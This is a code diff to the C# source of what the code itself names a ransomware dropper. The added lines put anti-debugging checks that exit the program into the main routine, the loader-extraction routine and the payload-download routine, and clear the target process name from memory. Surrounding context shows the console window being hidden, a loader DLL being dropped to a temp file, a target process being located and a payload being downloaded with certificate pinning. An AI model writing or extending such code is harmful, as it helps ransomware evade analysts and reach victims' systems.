@@ -12,7 +12,9 @@ using System.Runtime.InteropServices;
 using System.Text;
 using System.IO;
 using System.Security.Cryptography.X509Certificates;
-using System.Net.Security;
+#if !DEBUG
+    using BisquillaRansomwareDropper;
+#endif
 
 namespace BisquillaRansomwareDropper
 {
@@ -39,6 +41,17 @@ namespace BisquillaRansomwareDropper
 
         static int Main(string[] args)
         {
+#if !DEBUG
+            // BEGIN DEBUG DETECTION
+            bool isDebuggerPresent = false;
+            Common.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
+            if (isDebuggerPresent || Debugger.IsAttached)
+            {
+                Environment.Exit(-1);
+            }
+            // END DEBUG DETECTION
+#endif
+
             // Hide Console Window
             ShowWindow(GetConsoleWindow(), SW_HIDE);
 
@@ -63,6 +76,7 @@ namespace BisquillaRansomwareDropper
             try
             {
                 targetProcessId = Process.GetProcessesByName(targetProcessName)[0].Id;
+                Common.ClearString(ref targetProcessName);
             }
             catch (Exception e)
             {
@@ -126,6 +140,17 @@ namespace BisquillaRansomwareDropper
         /// <returns>File Path</returns>
         private static string ExtractCppLoader()
         {
+#if !DEBUG
+            // BEGIN DEBUG DETECTION
+            bool isDebuggerPresent = false;
+            Common.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
+            if (isDebuggerPresent || Debugger.IsAttached)
+            {
+                Environment.Exit(-1);
+            }
+            // END DEBUG DETECTION
+#endif
+
             String moduleTempFileName = Path.GetTempFileName().Replace(".tmp", ".dll");
 
             using (FileStream fs = new FileStream(moduleTempFileName, FileMode.Create))
@@ -149,6 +174,16 @@ namespace BisquillaRansomwareDropper
         /// <returns>File Path</returns>
         private static string DownloadAndSaveToDisk()
         {
+#if !DEBUG
+            // BEGIN DEBUG DETECTION
+            bool isDebuggerPresent = false;
+            Common.CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
+            if (isDebuggerPresent || Debugger.IsAttached)
+            {
+                Environment.Exit(-1);
+            }
+            // END DEBUG DETECTION
+#endif
 
             // Setup SSL Certificate Pinning
             ServicePointManager.ServerCertificateValidationCallback = delegate (object sender, X509Certificate certificate, X509Chain chain, System.Net.Security.SslPolicyErrors sslPolicyErrors)
